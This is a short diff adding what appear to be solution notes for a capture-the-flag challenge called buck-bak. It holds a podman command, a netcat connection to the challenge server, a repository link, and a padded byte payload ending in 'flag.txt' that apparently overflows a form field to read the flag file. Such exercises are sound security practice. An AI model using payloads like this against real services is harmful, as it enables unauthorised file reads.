@@ -1,0 +1,11 @@
+podman run -it judyhoppsbuckeye1986/buck-bak:v0.3 bash
+cat test.sh
+nc buck-bak.chall.pwnoh.io 13387
+
+
+https://bitbucket.org/hoppscoding4u/buck-bak
+branch better-bodies-cd8eb50e09385e767b53d064353f07e1
+
+Title: A
+Body:
+b'B'*100 + b'C'*61 + b'flag.txt'
